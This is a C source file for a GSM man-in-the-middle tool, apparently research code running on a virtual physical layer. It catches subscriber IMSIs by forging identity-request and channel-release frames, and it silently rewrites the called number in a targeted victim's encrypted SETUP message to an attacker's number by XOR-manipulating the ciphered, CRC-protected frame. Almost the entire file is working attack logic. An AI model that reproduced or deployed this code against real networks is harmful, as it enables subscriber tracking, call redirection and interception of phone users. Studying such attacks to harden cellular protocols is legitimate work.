#include <stdio.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <talloc.h>


#include <osmocom/core/gsmtap.h>
#include <osmocom/core/utils.h>
#include <osmocom/gsm/protocol/gsm_04_08.h>
#include <osmocom/gsm/gsm48.h>
#include <osmocom/gsm/rsl.h>
#include <osmocom/core/gsmtap_util.h>
#include <osmocom/core/linuxlist.h>
#include <osmocom/gsm/lapd_core.h>
#include <osmocom/gsm/lapdm.h>

#include <virtphy/common_util.h>
#include <mitm/lapdm_util.h>
#include <mitm/coder.h>
#include <mitm/osmo_mitm.h>
#include <mitm/l1_util.h>
#include <mitm/subscriber_mapping.h>

enum mitm_state {
	STATE_IMSI_CATCHER_SABM = 0, // we need to get the target imsi - tmsi mapping before we can go on with the attack. Basically we are an imsi catcher in this state.
	STATE_IMSI_CATCHER_I_TO_ID_REQ, // we manipulate the next information frame from the network to a fake identity request. So we do not have to implement a scheduler in the mitm.
	STATE_IMSI_CATCHER_IDENTITY_RESPONSE, // we get the requested identity from the response and block it
	STATE_IMSI_CATCHER_I_TO_CHAN_REL, // we manipulate the next information frame from the network to a channel release msg
	STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, // Wait for either SERVICE ACCEPT or CIPHERING MODE COMMAND
	STATE_INTERCEPT_SETUP, // Wait for SETUP message
};

const struct value_string vs_mitm_states[] = {
        {STATE_IMSI_CATCHER_SABM, "Wait for Sabm"},
        {STATE_IMSI_CATCHER_I_TO_ID_REQ, "I Frame to Identity Request"},
        {STATE_IMSI_CATCHER_IDENTITY_RESPONSE, "Wait for Identity Response"},
        {STATE_IMSI_CATCHER_I_TO_CHAN_REL, "I Frame to Channel Release"},
        {STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD, "Wait for CM Service Accept | Ciphering Mode Cmd"},
        {STATE_INTERCEPT_SETUP, "Wait for Setup"},
};

struct pending_identity_request {
	uint8_t mi_type; // @see Table 10.5.4 in TS 04.08
	struct map_imsi_tmsi * subscriber;
	struct chan_desc chan;
	uint8_t max_count;
	uint8_t request_lapd_hdr[3];
	uint8_t response_lapd_hdr[3];
};

struct pending_setup_intercept {
	uint8_t frame_delay;
	struct chan_desc chan;
};

static uint32_t intercept_arfcn = 666;
static enum mitm_state mitm_state = STATE_IMSI_CATCHER_SABM;
static struct pending_identity_request pending_identity_req;
static struct pending_setup_intercept pending_setup_interc;

static char *imsi_victim; // victims imsi
static char *msisdn_called; // called telephone number
static char *msisdn_attacker; // attacker telephone number
static int msidn_offset_from_l2_hdr = 3 + 11; // bytes between bcd coded msisdn and start of lapdm header

int dump_msgs = 0;

void handle_suboptions(int argc, char **argv)
{
	while (1) {
		int option_index = 0, c;
		static struct option long_options[] = {
		        {"dump-msgs", no_argument, &dump_msgs, 1},
		        {"imsi-victim", 1, 0, 'a'},
		        {"msisdn-called", 1, 0, 'b'},
		        {"msisdn-attacker", 1, 0, 'c'},
		        {"msisdn-to-setup-offset", 1, 0, 'd'},
		        {0, 0, 0, 0},
		};
		c = getopt_long(argc, argv, "a:b:c:d:", long_options,
				                &option_index);
				if (c == -1)
					break;

				switch (c) {
				case 'a':
					imsi_victim = optarg;
					break;

				case 'b':
					msisdn_called = optarg;
					break;

				case 'c':
					msisdn_attacker = optarg;
					break;

				case 'd':
					msidn_offset_from_l2_hdr = 3 + atoi(optarg);
					break;
				default:
					break;
				}
	}
}

static void manip_enc_lapdm_frame(uint8_t *manip_enc, uint8_t *data_enc, uint16_t data_enc_len_bytes, uint8_t *data_xor_manip) {

	uint8_t data_xor_manip_cc[LEN_CC] = {0};
	uint8_t crc_remainder_cc[LEN_CC] = {0};
	uint8_t data_cc[LEN_CC] = {0};
	uint8_t crc_remainder[LEN_CRC / 8 + 1] = {0};
	int i;

	// init crc remainder
	for(i = LEN_PLAIN / 8; i < LEN_CRC / 8; ++i) {
		crc_remainder[i] = 0xff;
	}
	crc_remainder[i] = 0xf0;

	fprintf(stderr, "data XOR manip = %s\n", osmo_hexdump(data_xor_manip, LEN_PLAIN / 8));
	fprintf(stderr, "remainder = %s\n", osmo_hexdump(crc_remainder, LEN_CRC / 8 + 1));
	fprintf(stderr, "[ciph]map(il((cc(crc(data))))) = %s\n", osmo_hexdump(data_enc, data_enc_len_bytes));

	if(data_enc_len_bytes != LEN_BURSTMAP_XCCH / 8 && data_enc_len_bytes != LEN_BURSTMAP_FACCH / 8) {
		return;
	}

	// -> cc(crc(data XOR manip))
	xcch_encode(PLAIN, data_xor_manip, NULL, NULL, data_xor_manip_cc, NULL);
	fprintf(stderr, "cc(crc(data XOR manip)) = %s\n", osmo_hexdump(data_xor_manip_cc, LEN_CC / 8));
	// -> cc(crc_remainder)
	xcch_encode(CRC, crc_remainder, NULL, NULL, crc_remainder_cc, NULL);
	fprintf(stderr, "cc(remainder) = %s\n", osmo_hexdump(crc_remainder_cc, LEN_CC / 8));
	// -> cc(crc(data XOR manip)) XOR cc(crc_remainder)
	xor_data(data_xor_manip_cc, data_xor_manip_cc, crc_remainder_cc, LEN_CC / 8);
	fprintf(stderr, "cc(crc(data XOR manip)) XOR cc(remainder) = %s\n", osmo_hexdump(data_xor_manip_cc, LEN_CC / 8));
	// get ciph(cc(crc(data))) from mapped and interleaved data
	if(data_enc_len_bytes == LEN_BURSTMAP_XCCH / 8) {
		xcch_decode(BURSTMAP_XCCH, data_enc, NULL, data_cc, NULL, NULL);
	} else if(data_enc_len_bytes == LEN_BURSTMAP_FACCH / 8) {
		facch_decode(BURSTMAP_FACCH, data_enc, NULL, data_cc, NULL, NULL);
	}
	fprintf(stderr, "[ciph](cc(crc(data))) = %s\n", osmo_hexdump(data_cc, LEN_CC / 8));
	// -> cc(crc(data XOR manip)) XOR cc(crc_remainder) XOR ciph(cc(crc(data))) == ciph(cc(crc(manip)))
	xor_data(data_cc, data_xor_manip_cc, data_cc, LEN_CC / 8);
	fprintf(stderr, "cc(crc(data XOR manip)) XOR cc(remainder) XOR [ciph](cc(crc(data))) = %s\n", osmo_hexdump(data_cc, LEN_CC / 8));

	// wichtig! die aus dem burst mapping kommenden stealing bits sind nicht verschlüsselt!
	// deshalb dürfen wir den dekodierten und manipulierten cc data stream im anschluss einfach wieder interleaven und mappen
	if(data_enc_len_bytes == LEN_BURSTMAP_XCCH / 8) {
		xcch_encode(CC, data_cc, manip_enc, NULL, NULL, NULL);
	} else if(data_enc_len_bytes == LEN_BURSTMAP_FACCH / 8) {
		facch_encode(CC, data_cc, manip_enc, NULL, NULL, NULL);
	}
	fprintf(stderr, "map(il(cc(crc(data XOR manip)) XOR cc(remainder) XOR [ciph](cc(crc(data))))) == [ciph](map(il(cc(crc(manip))))) = %s\n", osmo_hexdump(manip_enc, LEN_CC / 8));
}


static void manip_setup_msg(uint8_t *manip_msg_enc, uint8_t *msg_enc, uint16_t msg_enc_len_bytes) {

	uint8_t bcd_len = (strlen(msisdn_called)) / 2 + (strlen(msisdn_called) % 2);
	uint8_t data_xor_manip[LEN_PLAIN / 8] = {0};
	uint8_t bcd_called[bcd_len];
	uint8_t bcd_attacker[bcd_len];

	// manually initialization with 0
	memset( bcd_called, 0, bcd_len*sizeof(uint8_t) );
	memset( bcd_attacker, 0, bcd_len*sizeof(uint8_t) );

	gsm48_encode_bcd_number(bcd_called, strlen(msisdn_called), -1, msisdn_called);
	gsm48_encode_bcd_number(bcd_attacker, strlen(msisdn_attacker), -1, msisdn_attacker);

	fprintf(stderr, "Replacing ... \n");
	fprintf(stderr, "called bcd = %s\n", osmo_hexdump(bcd_called, bcd_len));
	fprintf(stderr, "attacker bcd = %s\n", osmo_hexdump(bcd_attacker, bcd_len));

	xor_data(&data_xor_manip[msidn_offset_from_l2_hdr], bcd_called, bcd_attacker, bcd_len);

	manip_enc_lapdm_frame(manip_msg_enc, msg_enc, msg_enc_len_bytes, data_xor_manip);

}

struct msgb *downlink_rcv_cb_handler(struct msgb *msg)
{
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr = NULL;
	struct gsm48_hdr *l3_hdr = NULL;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	struct msgb *manip_msg = NULL;
	uint8_t nr, ns; // lapdm received nr and sent nr
	uint8_t old_state = mitm_state;
	char description[100] = "";

	// simply forward downlink messages we do not want to intercept
	if (intercept_arfcn != arfcn) {
		goto forward_msg;
	}

	// forward all msgs not on a dedicated channel
	if (gsmtap_chantype != GSMTAP_CHANNEL_SDCCH4 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_SDCCH8 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_TCH_F) {
		goto forward_msg;
	}

	// preparate msg data
	chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
	chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
	msg->l2h = msgb_pull(msg, sizeof(*gh));
	l2_hdr = msgb_l2(msg);

	if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_MS, &mctx,
   			  &lctx)) {
		// Error might occur if lapdm header is invalid, encoded or enciphered.
		fprintf(stderr, "Could not parse lapd context of frame %u.\n",
		       gh->frame_number);
		goto push_hdr;
	}
	l3_hdr = msgb_l3(msg);
	// l1h and l2h need to be reassigned as they might have been reset by pull_lapdm_ctx
	msg->l2h = (unsigned char *) l2_hdr;
	msg->l1h = (unsigned char *) gh;

	switch (mitm_state) {
	case STATE_IMSI_CATCHER_I_TO_ID_REQ:
		// check if we have an I Frame to manipulate
		if(LAPDm_CTRL_is_I(l2_hdr[1]) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + (sizeof(*gh) * 8), "id_req");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			memcpy(manip_msg->l2h, l2_hdr, 3);
			lapdm_set_length((uint8_t *)manip_msg->l2h, 3, 0, 1);
			memcpy(pending_identity_req.request_lapd_hdr, manip_msg->l2h, 3);
			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_MM;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_MM_ID_REQ;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = pending_identity_req.mi_type;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_IDENTITY_RESPONSE;
			sprintf(description, "Modified msg on downlink to identity request!");
		}
		break;
	case STATE_IMSI_CATCHER_I_TO_CHAN_REL:
		// check if we have an I or U Frame to manipulate
		if((LAPDm_CTRL_is_I(l2_hdr[1]) || LAPDm_CTRL_is_U(l2_hdr[1])) && is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			manip_msg = msgb_alloc(184 + sizeof(*gh) * 8, "chan_rel");
			// l1 hdr
			manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
			memcpy(manip_msg->l1h, gh, sizeof(*gh));
			// l2 hdr
			manip_msg->l2h = msgb_put(manip_msg, 3);
			// reuse l2 hdr of identity request
			memcpy(manip_msg->l2h, pending_identity_req.request_lapd_hdr, 3);
			ns = LAPDm_CTRL_Nr(pending_identity_req.response_lapd_hdr[1]); // set ns to fit with expected nr from ms
			nr = LAPDm_CTRL_Nr(pending_identity_req.request_lapd_hdr[1]) + 1 ; // increment nr from identity request
			// protocol id for I Frame i 0
			// correct the I Frames rec nr and sent nr
			manip_msg->l2h[1] = LAPDm_CTRL_I(nr, ns, 0);

			// l3 hdr
			manip_msg->l3h = msgb_put(manip_msg, 3);
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = GSM48_PDISC_RR;
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = GSM48_MT_RR_CHAN_REL;
			((struct gsm48_hdr *)manip_msg->l3h)->data[0] = GSM48_RR_CAUSE_NORMAL;

			// check proto disc and msg type, the values might not be one to one
			((struct gsm48_hdr *)manip_msg->l3h)->proto_discr = gsm48_hdr_pdisc((struct gsm48_hdr *)manip_msg->l3h);
			((struct gsm48_hdr *)manip_msg->l3h)->msg_type = gsm48_hdr_msg_type((struct gsm48_hdr *)manip_msg->l3h);

			mitm_state = STATE_IMSI_CATCHER_SABM;
			sprintf(description, "Modified msg on downlink to channel release request!");
		}
		break;
	case STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD:
		if(is_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype)) {
			// check if we have a MM msg
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM) {
				// of type service accept
				if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_ACC) {
					mitm_state = STATE_INTERCEPT_SETUP;
					pending_setup_interc.frame_delay = 2;
					sprintf(description, "Found CM service accept! Delay set to %d!", pending_setup_interc.frame_delay);
				}
				// or ciphering request
				else if(gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_RR_CIPH_M_CMD) {
					mitm_state = STATE_INTERCEPT_SETUP;
					pending_setup_interc.frame_delay = 3;
					sprintf(description, "Found RR ciphering mode command! Delay set to %d!", pending_setup_interc.frame_delay);
				}
			}
		}
		break;
	default:
		break;
	}

push_hdr:
	// push all the bits that have been pulled before so that we have the gsmtap header at the front again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

forward_msg:
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, manip_msg, dump_msgs, description);
	// Forward msg to downlink
	if(manip_msg != NULL) {
		msgb_free(msg);
		return manip_msg;
	}
	return msg;
}

struct msgb* uplink_rcv_cb_handler(struct msgb *msg)
{
	struct gsmtap_hdr *gh = msgb_l1(msg);
	uint8_t *l2_hdr = NULL;
	struct gsm48_hdr *l3_hdr = NULL;
	uint16_t arfcn = ntohs(gh->arfcn); // arfcn of the received msg
	uint8_t gsmtap_chantype = gh->sub_type; // gsmtap channel type
	uint8_t subslot = gh->sub_slot; // multiframe subslot to send msg in (tch -> 0-26, bcch/ccch -> 0-51)
	uint8_t timeslot = gh->timeslot; // tdma timeslot to send in (0-7)
	uint8_t rsl_chantype, link_id, chan_nr;
	struct lapdm_msg_ctx mctx;
	struct lapd_msg_ctx lctx;
	memset(&mctx, 0, sizeof(mctx));
	memset(&lctx, 0, sizeof(lctx));
	uint8_t old_state = mitm_state;
	char description[100] = "";

	uint8_t encoded_msg[LEN_BURSTMAP_XCCH / 8] = {0};
	uint8_t encoded_manip_msg[LEN_BURSTMAP_XCCH / 8] = {0};
	struct msgb *manip_msg = NULL;

	// simply forward uplink messages we do not want to intercept
	if ((intercept_arfcn | GSMTAP_ARFCN_F_UPLINK) != arfcn) {
		goto forward_msg;
	}

	// forward all msgs not on a dedicated channel
	if (gsmtap_chantype != GSMTAP_CHANNEL_SDCCH4 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_SDCCH8 &&
	    gsmtap_chantype != GSMTAP_CHANNEL_TCH_F) {
		goto forward_msg;
	}

	// preparate msg data
	chantype_gsmtap2rsl(gsmtap_chantype, &rsl_chantype, &link_id);
	chan_nr = rsl_enc_chan_nr(rsl_chantype, subslot, timeslot);
	msg->l2h = msgb_pull(msg, sizeof(*gh));
	l2_hdr = msgb_l2(msg);

	if (pull_lapd_ctx(msg, chan_nr, link_id, LAPDM_MODE_BTS, &mctx,
   			  &lctx)) {
		// Error might occur if lapdm header is invalid, encoded or enciphered
		fprintf(stderr, "Could not parse lapd context of frame %u.\n",
		       gh->frame_number);
		goto push_hdr;
	}
	l3_hdr = msgb_l3(msg);
	// l1h and l2h need to be reassigned as they might have been reset by pull_lapdm_ctx
	msg->l2h = (unsigned char *) l2_hdr;
	msg->l1h = (unsigned char *) gh;

	switch(mitm_state) {
	case STATE_IMSI_CATCHER_SABM:
		// check if we have a unnumbered frame of type SABM
		if(LAPDm_CTRL_is_U(l2_hdr[1]) && (lctx.s_u == LAPD_U_SABM || lctx.s_u == LAPD_U_SABME)) {
			struct map_imsi_tmsi *subscriber = NULL;

			// check if we have a MM CM service request
			if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_CM_SERV_REQ) {
				struct gsm48_service_request *sreq = (struct gsm48_service_request *) l3_hdr->data;
				subscriber = add_subscriber(sreq->mi, sreq->mi_len);

				// check if our victim subscriber requested a mobile originated call establishment
				if(subscriber != NULL && sreq->cm_service_type == GSM48_CMSERV_MO_CALL_PACKET && strcmp(subscriber->imsi, imsi_victim) == 0) {
					set_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype);
					mitm_state = STATE_INTERCEPT_SERVICE_ACCEPT_CIPHERING_MODE_CMD;
					sprintf(description, "Detected CM service request - mobile originated call of victim subscriber (imsi=%s, tmsi=%u)!", subscriber->imsi, subscriber->tmsi);
					break;
				}
			}
			// check if we have a MM CM service request
			else if(gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_LOC_UPD_REQUEST) {
				struct gsm48_loc_upd_req *lureq = (struct gsm48_loc_upd_req *) l3_hdr->data;
				subscriber = add_subscriber(lureq->mi, lureq->mi_len);
			}

			// check if we already have this subscriber's imsi-tmsi mapping
			if(subscriber != NULL && strcmp(subscriber->imsi, "") == 0) {
				pending_identity_req.subscriber = subscriber;
				pending_identity_req.mi_type = GSM_MI_TYPE_IMSI;
				pending_identity_req.max_count = 3;
				set_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype);

				// start imsi catcher routine
				mitm_state = STATE_IMSI_CATCHER_I_TO_ID_REQ;
				sprintf(description, "CM Service | Location update request with unmapped tmsi (%x)", subscriber->tmsi);
			}
		}
		break;
	case STATE_IMSI_CATCHER_IDENTITY_RESPONSE:
		if(is_channel(&pending_identity_req.chan, timeslot, subslot, gsmtap_chantype)) {
			if(--pending_identity_req.max_count == 0) {
				mitm_state = STATE_IMSI_CATCHER_SABM;
				sprintf(description, "No identity response detected within max msg count...");
			}
			// check if we have an I Frame - MM Identity Response
			if(LAPDm_CTRL_is_I(l2_hdr[1]) &&
			   gsm48_hdr_pdisc(l3_hdr) == GSM48_PDISC_MM &&
			   gsm48_hdr_msg_type(l3_hdr) == GSM48_MT_MM_ID_RESP) {
				uint8_t mi_len = l3_hdr->data[0]; // mobile identity length
				uint8_t* mi = &l3_hdr->data[1]; // mobile identity
				uint8_t mi_type = get_mi_type(mi);

				// check if we have a response to our identity request
				if(pending_identity_req.mi_type == mi_type) {
					memcpy(pending_identity_req.response_lapd_hdr, l2_hdr, 3);
					update_subscriber(pending_identity_req.subscriber, mi, mi_len);
					mitm_state = STATE_IMSI_CATCHER_I_TO_CHAN_REL;
					sprintf(description, "Catched and blocked identity response (%s)! Updated subscriber (imsi=%s, tmsi=%u)!", mi_type == GSM_MI_TYPE_IMSI ? "imsi" : "tmsi", pending_identity_req.subscriber->imsi, pending_identity_req.subscriber->tmsi);
					// we don't forward the id req
					goto block_msg;
				}
			}
		}
		break;
	case STATE_INTERCEPT_SETUP:
		if(is_channel(&pending_setup_interc.chan, timeslot, subslot, gsmtap_chantype)) {
			// the third message on uplink after ciphering mode command on downlink
			//  -> 1: LAPDM-Receive-Ready, 2: CIPHERING-MODE-COMPLETE, 3: SETUP
			// or the second message on uplink after CM service accept on downlink should be the setup message
			//  -> 1: LAPDM-Receive-Ready, 2: SETUP
			if(--pending_setup_interc.frame_delay == 0) {

				// push l2 hdr again, was pulled in msg preparation routine
				msgb_push(msg, msgb_data(msg) - (uint8_t *)l2_hdr);


				// allocate msg for manipulation
				manip_msg = msgb_alloc(184 + (sizeof(*gh) *8), "mod_setup");
				// copy gsmtap header to manip msg
				manip_msg->l1h = msgb_put(manip_msg, sizeof(*gh));
				memcpy(manip_msg->l1h, gh, sizeof(*gh));
				// from l2 the msg is probably enciphered, so we cannot use any info from that layers
				manip_msg->l2h = msgb_put(manip_msg, msgb_length(msg));

				// encode message as virtual layer does not support encoding right now
				xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
				manip_setup_msg(encoded_manip_msg, encoded_msg, LEN_BURSTMAP_XCCH / 8);
				xcch_decode(BURSTMAP_XCCH, encoded_manip_msg, NULL, NULL, NULL, manip_msg->l2h);

				mitm_state = STATE_IMSI_CATCHER_SABM;
				sprintf(description, "Setup message found and called number manipulated! Original number (%s) replaced with (%s)!", msisdn_called, msisdn_attacker);
			}
		}
		// do nothing if the incoming msg is not on the synced channel
		break;
	default:
		break;
	}

push_hdr:
	// push all the bits that have been pulled before so that we have the gsmtap header at the front again
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);

forward_msg:
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, manip_msg, dump_msgs, description);
	// Forward msg to downlink
	if(manip_msg != NULL) {
		msgb_free(msg);
		return manip_msg;
	}
	return msg;

block_msg:
	// need to push for logging
	msgb_push(msg, msgb_data(msg) - (uint8_t *)gh);
	log_state_change(old_state, mitm_state, vs_mitm_states, msg, NULL, dump_msgs, description);
	msgb_free(msg);
	// Forward msg to downlink
	return NULL;
}
